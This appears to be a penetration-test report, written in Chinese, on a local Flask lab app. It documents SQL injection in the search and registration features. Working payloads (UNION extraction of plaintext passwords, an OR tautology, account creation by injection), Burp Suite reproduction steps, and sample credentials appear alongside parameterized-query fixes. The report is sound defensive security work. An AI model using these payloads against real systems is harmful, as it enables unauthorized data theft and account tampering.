# SQL 注入漏洞测试报告

## 基本信息

| 项目 | 详情 |
|------|------|
| **项目名称** | 用户管理系统 (Flask Web Application) |
| **测试目标** | http://127.0.0.1:5000 |
| **测试日期** | 2026-07-20 |
| **测试类型** | 黑盒渗透测试 (Black-box Penetration Testing) |
| **漏洞类型** | SQL 注入 (SQL Injection) |
| **CWE 编号** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP 映射** | A03:2021 – Injection |

---

## 一、测试摘要

对用户管理系统的注册（`/register`）和搜索（`/search`）功能进行了 SQL 注入测试。两项功能均使用 **f-string 字符串拼接** 构造 SQL 语句，未对用户输入做任何过滤或转义，导致严重的 SQL 注入漏洞。

| POC | 攻击类型 | 结果 |
|-----|---------|------|
| POC 1 | UNION 注入（插入伪造数据） | ✅ 成功 |
| POC 2 | OR 注入（万能条件，返回全部用户） | ✅ 成功 |
| POC 3 | 注册 SQL 注入（创建恶意用户） | ✅ 成功 |
| POC 4 | UNION 注入（提取全部密码） | ✅ 成功 |

---

## 二、漏洞原理

### 2.1 字符串拼接 SQL（根本原因）

搜索和注册功能均使用 **f-string 字符串拼接** 构造 SQL 语句：

```python
# 搜索功能 — app.py 第 326 行
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"

# 注册功能 — app.py 第 301 行
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
```

用户输入中的单引号 `'` 会打破字符串边界，改变 SQL 语句的语法结构，导致任意 SQL 命令执行。

### 2.2 无输入过滤

所有用户输入（username、password、email、phone、keyword）均未经过任何转义或过滤，直接拼入 SQL 语句。

### 2.3 搜索有回显

`/search` 接口将查询结果以 HTML 表格形式返回在页面上，攻击者可通过 UNION 注入将数据库中任意数据映射到回显列中，实现数据窃取。

---

## 三、POC 实测记录

### POC 1：UNION 注入（插入伪造数据）

**Payload**（输入到搜索框）：
```sql
' UNION SELECT 1,'inj','pass','inj@x.com','138'--
```

**实测结果**：

| ID | 用户名 | 邮箱 | 手机 |
|----|--------|------|------|
| 1 | admin | admin@example.com | 13800138000 |
| **1** | **inj** | **inj@x.com** | **138** |
| 2 | alice | alice@example.com | 13900139001 |

**注入成功** — 搜索结果中出现攻击者伪造的数据行 `inj / inj@x.com / 138`。

**说明**：`SELECT * FROM users` 返回 5 列（id, username, password, email, phone），UNION SELECT 需匹配 5 列。实际测试中首次用 4 列时报错 `SELECTs to the left and right of UNION do not have the same number of result columns`，改为 5 列后注入成功。

---

### POC 2：OR 注入（万能条件）

**Payload**（输入到搜索框）：
```sql
' OR '1'='1
```

**实测结果**：

| ID | 用户名 | 邮箱 | 手机 |
|----|--------|------|------|
| 1 | admin | admin@example.com | 13800138000 |
| 2 | alice | alice@example.com | 13900139001 |

**注入成功** — `'1'='1` 是永真条件，WHERE 子句被绕过，返回了数据库中的全部 2 个用户（不包括后面注入创建的 hacker）。

---

### POC 3：注册 SQL 注入

**Payload**（用户名输入框）：
```
hacker', 'pass', 'h@x.com', '123')--
```
其余字段填任意值（password=irrelevant）。

**实测结果**：页面显示 **"注册成功，请登录"**。

通过正常搜索 `hacker` 验证是否写入数据库：

| ID | 用户名 | 邮箱 | 手机 |
|----|--------|------|------|
| 7 | hacker | h@x.com | 123 |

**注入成功** — 攻击者成功创建了一个用户名为 `hacker`、密码为 `pass` 的账号，且该账号通过 `INSERT OR IGNORE` 之外的方式绕过正常的注册流程。

---

### POC 4：UNION 注入提取全部密码

**Payload**（输入到搜索框）：
```sql
' UNION SELECT id,username,password,password,phone FROM users--
```

**实测结果**：

| ID | 用户名 | 邮箱（实际是密码） | 手机 |
|----|--------|--------------------|------|
| 1 | admin | **admin123** | 13800138000 |
| 2 | alice | **alice2025** | 13900139001 |
| 7 | hacker | **pass** | 123 |

**所有数据库中的密码明文已全部泄露！**

**说明**：由于页面模板渲染时跳过索引 2（密码列）而显示索引 3（邮箱列），攻击者将密码值映射到第 4 个 SELECT 位置（对应模板的邮箱列），成功使密码显示在页面上。

---

## 四、Burp Suite 复现步骤

1. 用 admin / Admin@2025#Secure 登录，访问首页
2. 打开 Burp Suite → Proxy → Intercept 开启
3. 在搜索框输入任意关键词（如 `test`），点击搜索
4. 在 Burp 中拦截 GET `/search?keyword=test` 请求 → 发送到 Repeater
5. 修改 keyword 参数为以下 payload 并发送：

   | Payload | 预期效果 |
   |---------|---------|
   | `' OR '1'='1` | 返回全部用户 |
   | `' UNION SELECT 1,2,3,4,5--` | 验证列数（列数不对会报错） |
   | `' UNION SELECT id,username,password,password,phone FROM users--` | 提取所有密码 |

6. 观察 Response 中的 HTML table，确认注入成功

---

## 五、危害评估

| 危害维度 | 评级 | 说明 |
|----------|------|------|
| **数据泄露** | Critical | 可提取数据库中所有用户的密码及个人信息 |
| **权限绕过** | High | 注册注入可创建任意凭据的账号（我们通过bug并未真的登录了hacker，所以密码是直接提取即可手动登录，而非在已登录状态下通过注入伪造session） |
| **数据篡改** | High | 注册注入可绕过正常注册流程插入恶意数据 |
| **利用难度** | Low | 无需任何工具，浏览器地址栏即可完成注入 |

---

## 六、修复建议

### 6.1 立即修复（代码层面）

**替换所有 f-string SQL 拼接为参数化查询**：

```python
# 修复前（搜索）
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"

# 修复后（搜索）
sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
cursor.execute(sql, (f"%{keyword}%", f"%{keyword}%"))

# 修复前（注册）
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"

# 修复后（注册）
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
cursor.execute(sql, (username, password, email, phone))
```

### 6.2 其他加固措施

- 对用户输入增加白名单校验（用户名仅允许字母数字下划线）
- 数据库启用最小权限原则（应用账号不应有 DROP/ALTER 权限）
- 部署 WAF 拦截 SQL 注入 payload

---

## 七、测试环境

| 项目 | 详情 |
|------|------|
| 操作系统 | Windows 11 |
| 应用框架 | Python 3.14 + Flask |
| 数据库 | SQLite 3（data/users.db） |
| 测试工具 | Playwright (浏览器自动化) + Burp Suite |

---

*报告生成时间: 2026-07-20*
